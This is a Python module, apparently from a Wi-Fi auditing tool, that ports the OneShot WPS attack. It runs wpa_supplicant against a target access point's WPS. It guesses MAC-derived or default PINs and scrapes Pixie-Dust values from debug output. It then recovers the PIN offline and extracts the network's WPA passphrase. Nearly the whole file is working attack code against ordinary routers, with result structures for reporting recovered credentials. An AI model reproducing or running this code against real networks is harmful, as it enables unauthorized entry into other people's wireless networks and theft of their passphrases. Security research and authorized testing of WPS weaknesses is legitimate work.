"""wpa_supplicant-based WPS backend ported from OneShot.

This is intentionally close to the original OneShot implementation
(https://github.com/drygdryg/OneShot): it drives ``wpa_supplicant`` in
managed mode, talks to its control interface, parses the debug output to
extract Pixie-Dust material, and runs the PIN exchange. The differences
from upstream are:

- Uses the project's own ``pin_gen.WPSpin`` for MAC-based PIN guesses.
- Uses the project's own ``pixie_dust`` instead of shelling out to
  ``pixiewps``.
- Returns structured results instead of printing to stdout.
- Cleans up temp files on context-manager exit.
"""

from __future__ import annotations

import codecs
import os
import select
import shutil
import socket
import subprocess
import sys
import tempfile
import time
from collections.abc import Iterator
from dataclasses import dataclass
from enum import Enum
from typing import Self

from ..radio import RadioError, get_mode, get_permanent_mac, set_managed_mode
from .pin_gen import WPSpin
from .pixie import pixie_dust


class Outcome(Enum):
    SUCCESS = "success"
    WSC_NACK = "wsc_nack"
    WPS_FAIL = "wps_fail"
    NO_DATA = "no_data"


# WPS Configuration Error values, verbatim from wpa_supplicant/hostapd's
# src/wps/wps_defs.h (WPS_CFG_* enum). This is what a WSC_NACK's
# Configuration Error attribute actually encodes.
WPS_CONFIG_ERRORS = {
    0: "No Error",
    1: "OOB Interface Read Error",
    2: "Decryption CRC Failure",
    3: "2.4GHz Channel Not Supported",
    4: "5.0GHz Channel Not Supported",
    5: "Signal Too Weak",
    6: "Network Auth Failure",
    7: "Network Association Failure",
    8: "No DHCP Response",
    9: "Failed DHCP Config",
    10: "IP Address Conflict",
    11: "Could Not Connect to Registrar",
    12: "Multiple PBC Sessions Detected",
    13: "Rogue Activity Suspected",
    14: "Device Busy",
    15: "Setup Locked",
    16: "Message Timeout",
    17: "Registration Session Timeout",
    18: "Device Password Auth Failure",
}


@dataclass
class OneShotResult:
    outcome: Outcome
    ssid: str | None = None
    bssid: str | None = None
    pin: str | None = None
    psk: str | None = None
    pixie_pin: str | None = None
    detail: str | None = None


@dataclass
class PixieCreds:
    pke: str = ""
    pkr: str = ""
    e_hash1: str = ""
    e_hash2: str = ""
    authkey: str = ""
    e_nonce: str = ""

    def clear(self) -> None:
        self.__init__()  # type: ignore[misc]

    def complete(self) -> bool:
        return bool(
            self.pke and self.pkr and self.e_nonce and self.authkey
            and self.e_hash1 and self.e_hash2
        )


@dataclass
class ConnectionStatus:
    status: str = ""
    last_m_message: int = 0
    ssid: str = ""
    psk: str = ""
    bssid: str = ""
    nack_config_error: int | None = None
    nack_detail: str = ""

    def clear(self) -> None:
        self.__init__()  # type: ignore[misc]

    @property
    def first_half_valid(self) -> bool:
        return self.last_m_message > 5


def _get_hex(line: str) -> str:
    """Extract hexdump payload from a ``wpa_supplicant -K -d`` line."""
    parts = line.split(":", 3)
    return parts[2].replace(" ", "").upper()


def _normalize_mac(mac: str) -> str:
    return mac.replace("-", ":").replace(".", ":").lower()


class OneShot:
    """Drive a single WPS session through wpa_supplicant."""

    def __init__(self, interface: str, bssid: str = "", verbose: bool = False):
        self.interface = interface
        self.bssid = _normalize_mac(bssid)
        self.verbose = verbose

        # OneShot needs managed mode. Record the original mode so we can
        # restore it after the attack, and switch now if necessary.
        self._original_mode = get_mode(interface)
        self._restore_mac: str | None = None
        if self._original_mode == "monitor":
            self._restore_mac = get_permanent_mac(interface)
            set_managed_mode(interface, restore_mac=self._restore_mac)

        # Stop any existing wpa_supplicant on this interface so our instance
        # can claim the radio without "resource busy" conflicts.
        subprocess.run(
            ["wpa_cli", "-i", interface, "terminate"],
            capture_output=True,
            errors="replace",
            check=False,
        )
        time.sleep(0.2)

        self.tempdir = tempfile.mkdtemp(prefix="atwa_wps_")
        self.tempconf = os.path.join(self.tempdir, "wpa_supplicant.conf")
        with open(self.tempconf, "w") as f:
            f.write(
                f"ctrl_interface={self.tempdir}\n"
                "ctrl_interface_group=root\n"
                "update_config=1\n"
            )
        self.wpas_ctrl_path = os.path.join(self.tempdir, interface)
        self._init_wpa_supplicant()

        self.res_socket_file = os.path.join(
            self.tempdir, f"reply-{os.urandom(4).hex()}"
        )
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixieCreds()
        self.connection_status = ConnectionStatus()
        self.generator = WPSpin()
        self.last_pwr = ""

    def _init_wpa_supplicant(self) -> None:
        cmd = [
            "wpa_supplicant",
            "-K", "-d",
            "-Dnl80211,wext,hostapd,wired",
            f"-i{self.interface}",
            f"-c{self.tempconf}",
        ]
        self.wpas = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            errors="replace",
        )
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                out, _ = self.wpas.communicate()
                raise RuntimeError(f"wpa_supplicant failed: {out}")
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(0.1)

    def send_only(self, command: str) -> None:
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def send_and_receive(self, command: str) -> str:
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        data, _ = self.retsock.recvfrom(4096)
        return data.decode("utf-8", errors="replace")

    @staticmethod
    def _explain_wpas_not_ok(command: str, respond: str) -> str:
        if command.startswith(("WPS_REG", "WPS_PBC")) and respond == "UNKNOWN COMMAND":
            return (
                "wpa_supplicant is compiled without WPS support "
                '(build with CONFIG_WPS=y)'
            )
        return f"wpa_supplicant command failed: {respond!r}"

    def _handle_line(self, line: str, pixiemode: bool = False, pbc_mode: bool = False) -> bool:
        line = line.rstrip("\n")
        if self.verbose:
            print(line, file=sys.stderr)

        if line.startswith("WPS: "):
            if "Building Message M" in line:
                n = int(line.split("Building Message M")[1].replace("D", ""))
                self.connection_status.last_m_message = n
            elif "Received M" in line:
                n = int(line.split("Received M")[1])
                self.connection_status.last_m_message = n
                if n == 5:
                    pass  # first half valid signal
            elif "Received WSC_NACK" in line:
                self.connection_status.status = "WSC_NACK"
            elif "Enrollee terminated negotiation with Configuration Error" in line:
                try:
                    code = int(line.rsplit("Error", 1)[1].strip())
                except (ValueError, IndexError):
                    code = None
                self.connection_status.nack_config_error = code
                if code is not None:
                    self.connection_status.nack_detail = WPS_CONFIG_ERRORS.get(
                        code, f"Unknown/vendor-specific ({code})"
                    )
            elif "No Configuration Error attribute in WSC_NACK" in line:
                self.connection_status.nack_detail = (
                    "AP sent no Configuration Error code (silent NACK)"
                )
            elif "terminated by the Enrollee" in line:
                self.connection_status.nack_detail = (
                    "external-registrar negotiation terminated (UPnP path, "
                    "no Configuration Error code available)"
                )
            elif "Enrollee Nonce" in line and "hexdump" in line:
                self.pixie_creds.e_nonce = _get_hex(line)
            elif "DH own Public Key" in line and "hexdump" in line:
                self.pixie_creds.pkr = _get_hex(line)
            elif "DH peer Public Key" in line and "hexdump" in line:
                self.pixie_creds.pke = _get_hex(line)
            elif "AuthKey" in line and "hexdump" in line:
                self.pixie_creds.authkey = _get_hex(line)
            elif "E-Hash1" in line and "hexdump" in line:
                self.pixie_creds.e_hash1 = _get_hex(line)
            elif "E-Hash2" in line and "hexdump" in line:
                self.pixie_creds.e_hash2 = _get_hex(line)
            elif "Network Key" in line and "hexdump" in line:
                self.connection_status.status = "GOT_PSK"
                self.connection_status.psk = bytes.fromhex(
                    _get_hex(line)
                ).decode("utf-8", errors="replace")
        elif ": State: " in line and "-> SCANNING" in line:
            self.connection_status.status = "scanning"
        elif "WPS-FAIL" in line and self.connection_status.status:
            self.connection_status.status = "WPS_FAIL"
        elif "Trying to authenticate with" in line:
            self.connection_status.status = "authenticating"
            if "SSID" in line:
                self.connection_status.ssid = _unescape_ssid(line)
        elif "Authentication response" in line:
            pass
        elif "Trying to associate with" in line:
            self.connection_status.status = "associating"
            if "SSID" in line:
                self.connection_status.ssid = _unescape_ssid(line)
        elif "Associated with" in line and self.interface in line:
            self.connection_status.bssid = line.split()[-1].upper()
        elif "EAPOL: txStart" in line:
            self.connection_status.status = "eapol_start"
        elif "EAP entering state IDENTITY" in line or "using real identity" in line:
            pass
        elif pbc_mode and "selected BSS " in line:
            self.connection_status.bssid = line.split("selected BSS ")[-1].split()[0].upper()
        elif self.bssid in line and "level=" in line:
            self.last_pwr = line.split("level=")[1].split()[0]
        return True

    def _stdout(self):
        """Return wpa_supplicant's stdout (always PIPE, so never None)."""
        assert self.wpas.stdout is not None
        return self.wpas.stdout

    def _drain_trailing_lines(self, timeout: float = 0.5) -> Iterator[str]:
        """Read any lines wpa_supplicant emits shortly after a terminal
        event (e.g. the Configuration Error line that follows "Received
        WSC_NACK") before the caller tears the subprocess down. Without
        this, terminate() can SIGTERM wpa_supplicant while that follow-up
        text is still sitting in its stdio buffer, unflushed and lost."""
        stdout = self._stdout()
        fileno = stdout.fileno()
        while True:
            ready, _, _ = select.select([fileno], [], [], timeout)
            if not ready:
                return
            line = stdout.readline()
            if not line:
                return
            yield line

    def _read_events(self, pixiemode: bool = False, pbc_mode: bool = False) -> Iterator[str]:
        """Yield raw wpa_supplicant lines until the session ends."""
        stdout = self._stdout()
        while True:
            line = stdout.readline()
            if not line:
                self.wpas.wait()
                break
            yield line
            self._handle_line(line, pixiemode=pixiemode, pbc_mode=pbc_mode)
            if self.connection_status.status in ("WSC_NACK", "GOT_PSK", "WPS_FAIL"):
                for trailing in self._drain_trailing_lines():
                    yield trailing
                    self._handle_line(trailing, pixiemode=pixiemode, pbc_mode=pbc_mode)
                break

    def wps_connection(self, bssid: str | None = None, pin: str | None = None,
                       pixiemode: bool = False, pbc_mode: bool = False) -> bool:
        self.pixie_creds.clear()
        self.connection_status.clear()
        # Drain some buffered output
        self._stdout().read(300)

        if pbc_mode:
            cmd = f"WPS_PBC {bssid}" if bssid else "WPS_PBC"
        else:
            cmd = f"WPS_REG {bssid} {pin}"

        reply = self.send_and_receive(cmd)
        if "OK" not in reply:
            self.connection_status.status = "WPS_FAIL"
            self.connection_status.psk = self._explain_wpas_not_ok(cmd, reply)
            return False

        for _ in self._read_events(pixiemode=pixiemode, pbc_mode=pbc_mode):
            pass

        self.send_only("WPS_CANCEL")
        return False

    def single_connection(self, bssid: str, pin: str | None = None,
                          pixiemode: bool = False, pbc_mode: bool = False,
                          pixieforce: bool = False) -> OneShotResult:
        if pbc_mode:
            self.wps_connection(bssid=bssid, pbc_mode=True)
            bssid = self.connection_status.bssid or bssid
            pin = "<PBC>"
        else:
            pin = pin or self.generator.get_likely(bssid) or "12345670"
            self.wps_connection(bssid=bssid, pin=pin, pixiemode=pixiemode)

        if self.connection_status.status == "GOT_PSK":
            return OneShotResult(
                outcome=Outcome.SUCCESS,
                ssid=self.connection_status.ssid,
                bssid=bssid,
                pin=pin,
                psk=self.connection_status.psk,
            )

        if pixiemode and self.pixie_creds.complete():
            pd = pixie_dust(
                e_nonce=bytes.fromhex(self.pixie_creds.e_nonce),
                auth_key=bytes.fromhex(self.pixie_creds.authkey),
                pke=bytes.fromhex(self.pixie_creds.pke),
                pkr=bytes.fromhex(self.pixie_creds.pkr),
                e_hash1=bytes.fromhex(self.pixie_creds.e_hash1),
                e_hash2=bytes.fromhex(self.pixie_creds.e_hash2),
                timestamp=int(time.time()),
            )
            if pd.pin is not None:
                verify = self.single_connection(
                    bssid=bssid, pin=pd.pin,
                    pixiemode=False, pbc_mode=False,
                )
                if verify.outcome is Outcome.SUCCESS:
                    verify.pixie_pin = pd.pin
                    return verify
                return OneShotResult(
                    outcome=Outcome.WPS_FAIL,
                    bssid=bssid,
                    pixie_pin=pd.pin,
                    detail="Pixie PIN found but verification failed",
                )
            return OneShotResult(
                outcome=Outcome.NO_DATA,
                bssid=bssid,
                detail="Pixie-Dust could not recover PIN",
            )

        if self.connection_status.status == "WSC_NACK":
            if self.connection_status.nack_detail:
                detail = f"AP returned WSC_NACK: {self.connection_status.nack_detail}"
            else:
                detail = (
                    "AP returned WSC_NACK (no Configuration Error line captured "
                    "from wpa_supplicant)"
                )
            return OneShotResult(
                outcome=Outcome.WSC_NACK,
                bssid=bssid,
                pin=pin,
                detail=detail,
            )

        return OneShotResult(
            outcome=Outcome.WPS_FAIL,
            bssid=bssid,
            pin=pin,
            detail=self.connection_status.psk or "wpa_supplicant WPS failed",
        )

    def pixie_dust_attack(self, bssid: str, pin: str | None = None) -> OneShotResult:
        """Run a single pixie-dust attempt against ``bssid``."""
        return self.single_connection(bssid=bssid, pin=pin, pixiemode=True)

    def cleanup(self) -> None:
        try:
            self.retsock.close()
        except Exception:  # noqa: BLE001, S110 - cleanup must be best-effort
            pass
        try:
            self.wpas.terminate()
        except Exception:  # noqa: BLE001, S110 - cleanup must be best-effort
            pass
        try:
            os.remove(self.res_socket_file)
        except Exception:  # noqa: BLE001, S110 - cleanup must be best-effort
            pass
        shutil.rmtree(self.tempdir, ignore_errors=True)
        # Restore monitor mode if that is where we started.
        if self._original_mode == "monitor":
            from ..radio import set_monitor_mode
            try:
                set_monitor_mode(
                    self.interface,
                    randomize_mac=False,
                    patch_txpower=False,
                )
            except RadioError:
                pass

    def __enter__(self) -> Self:
        return self

    def __exit__(self, *exc) -> None:
        self.cleanup()


def _unescape_ssid(line: str) -> str:
    """Pull the quoted SSID out of a wpa_supplicant log line."""
    parts = line.split("'")
    if len(parts) < 3:
        return ""
    raw = "'".join(parts[1:-1])
    try:
        return (
            codecs.decode(raw, "unicode-escape")
            .encode("latin1")
            .decode("utf-8", errors="replace")
        )
    except (UnicodeDecodeError, UnicodeError):
        return raw


def oneshot_pixie(iface: str, bssid: str, verbose: bool = False,
                  pin: str | None = None) -> OneShotResult:
    """Convenience wrapper: one pixie-dust attempt via wpa_supplicant."""
    with OneShot(iface, bssid=bssid, verbose=verbose) as shot:
        return shot.pixie_dust_attack(bssid, pin=pin)
